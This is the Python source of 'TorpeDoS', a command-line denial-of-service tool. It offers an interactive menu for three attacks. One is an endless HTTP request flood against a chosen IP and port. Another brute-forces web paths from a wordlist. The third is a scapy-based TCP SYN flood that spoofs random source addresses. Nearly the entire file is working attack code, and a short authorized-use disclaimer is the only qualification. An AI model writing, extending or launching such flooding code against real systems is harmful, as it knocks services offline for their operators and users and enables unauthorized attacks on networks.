import socket
import threading
import random
from scapy.all import send, IP, TCP
import sys
from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format

# ======================== Details ===========================
def print_header():
   init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
   cprint(figlet_format('TorpeDoS'),'blue', attrs=['bold'])
   print('\nTorpeDoS 1.2.0 - Denial of Service (DoS) Tool')
   print('\nCopyright (c) github.com/M-Alhassan')
   print('\nDisclaimer: This tool is intended for authorized and responsible use only.\nDo not use this tool to launch Denial of Service attacks against any network or system without proper authorization.\nUnauthorized use of this tool may violate local, national, and international laws.')
   print('\nMake sure to run using highest privileges (sudo)')
   print('')
   print('')
# ======================== Details ===========================

# Help prompt
def help():
      print('\nCommands:')
      print('  -httpf            Launch an HTTP flood attack')
      print('  -httpdt           Launch an HTTP directory traversal attack')
      print('  -tcpsf            Launch a TCP SYN flood attack')
      print('  -h, -help         Display the help menu')
      print('  exit              Terminate the program')
      print('\nTypes of DoS Attacks:')
      print('  1. HTTP Flood Attack:')
      print('     - Launches a flood of HTTP requests to overwhelm the target web server.')
      print('     - Floods the target with a high volume of HTTP GET or POST requests, consuming server resources.')
      print('     - Often involves the use of multiple attacking devices or botnets to generate a massive request traffic.')
      print('     - The requests are as follows: <METHOD>/<path><ip_address> HTTP/1.1')
      print('     - HTTP methods supported (GET, POST, CONNECT)')
      print('  2. HTTP Directory Traversal Attack:')
      print('     - Exploits vulnerabilities in web servers by brute forcing multiple requests to specific paths beyond the web root directory.')
      print('     - Customzie dictionary in lib/directories.txt')
      print('     - HTTP methods supported (GET, POST, CONNECT)')
      print('  3. TCP SYN Flood Attack:')
      print('     - Floods the target with a large number of TCP connection requests, exhausting server resources.')
      print('     - Sends a flood of TCP SYN packets to overwhelm the target, preventing legitimate connections from being established.')
      print('     - Can lead to a complete denial of service, making the server unresponsive to all connection attempts.')
      print('  Note: Unauthorized use of DoS attacks is illegal and can cause harm to networks and systems. Use this tool responsibly and with proper authorization.')

# Generate random IP address
def random_IP():
   ip = ".".join(map(str,(random.randint(0,255) for i in range (4))))
   return ip

# HTTP Flood Attack
def http_flood_attack(target_ip, target_port, target_path, spoofed_ip, method):
   print('\nExecuting Attack ...\n\nPress Ctrl+C to end')
   try:
        while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip, target_port))
         s.sendto((method + " /" + target_path + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
         s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
         s.close()
   except Exception as e:
        print('Error: ', e)

def http_diretory_traversal_attack(target_ip, target_port, dir_list, spoofed_ip, method):
   print('\nExecuting Attack ...\n\nPress Ctrl+C to end')
   try:
      for dir in dir_list:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip, target_port))
         s.sendto((method + " /" + dir + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
         s.sendto(("Host: " + spoofed_ip  + "\r\n\r\n").encode('ascii'), (target_ip, 3000))
         s.close()
   except Exception as e:
      print('Error: ', e)


def tcp_syn_flood_attack(target_ip, destination_port, spoofed_ip, num_packets):
   max_ports = 65535
   print('\nExecuting Attack ...\n\nPress Ctrl+C to end')
   for i in range(num_packets):
      seq_n = random.randint(0, max_ports)
      sPort = random.randint(0, max_ports)
      window = random.randint(0, max_ports)
      if (spoofed_ip == "rand"):
         src_ip = random_IP()
      else:
         src_ip = spoofed_ip
      packet = IP(dst=target_ip, src=src_ip)/TCP(sport=sPort, dport=destination_port, flags="S", seq=seq_n, window=window)
      send(packet, verbose=0)
   print('\nAll packets have been sent')

# Prompt
print_header()

while True:
   print('\nSelect an attack to execute or type -h for help:')
   print('  (1)      Launch an HTTP flood attack')
   print('  (2)      Launch an HTTP directory traversal attack')
   print('  (3)      Launch a TCP SYN flood attack')
   print('')
   user_input = input("> ")
   if user_input == "1" or user_input == "-httpf":
      try:
         target_ip = input('Enter target IP: ')
         target_port = int(input ('Enter target port: '))
         method = input('Enter HTTP method: ')
         target_path = input('Enter the target\'s url path: ')
         spoofed_ip = input('Enter the spoofed IP: ')
         for i in range(500):
            thread = threading.Thread(target=http_flood_attack(target_ip, target_port, target_path, spoofed_ip, method))
            thread.start()    
      except KeyboardInterrupt:
         print(' Attack Stopped')
      except Exception as e:
         print(e)


   if user_input=="2" or user_input == "-httpdt":
      try:
         file_path = "lib/directories.txt"
         with open(file_path, 'r') as file:
            dir_list = file.read().splitlines()
            #print("List of directories:", dir_list)
            target_ip = input('Enter target IP: ')
            target_port = int(input ('Enter target port: '))
            method = input('Enter HTTP method: ')
            spoofed_ip = input('Enter the spoofed IP: ')
            http_diretory_traversal_attack(target_ip, target_port, dir_list, spoofed_ip, method)
            print("\nAttack Executed")

      except Exception as e:
         print(e)

   elif user_input == "3" or user_input == "-tcpsf":
      try:
         target_ip = input('Enter target IP: ')
         target_port = int(input ('Enter target port: '))
         spoofed_ip = input('Enter spoofed IP or type (rand) for random IPs: ')
         num_packets = int(input('Enter number of packets to send: '))
         tcp_syn_flood_attack(target_ip, target_port, spoofed_ip, num_packets)   
      except KeyboardInterrupt:
         print(' Attack Stopped')
      except Exception as e:
         print(e)

   elif user_input == "-h" or user_input == "-help":
      help()
   elif user_input == "exit":
      print('\nTerminating program...')
      sys.exit()
   else:
      print('\nInvalid input')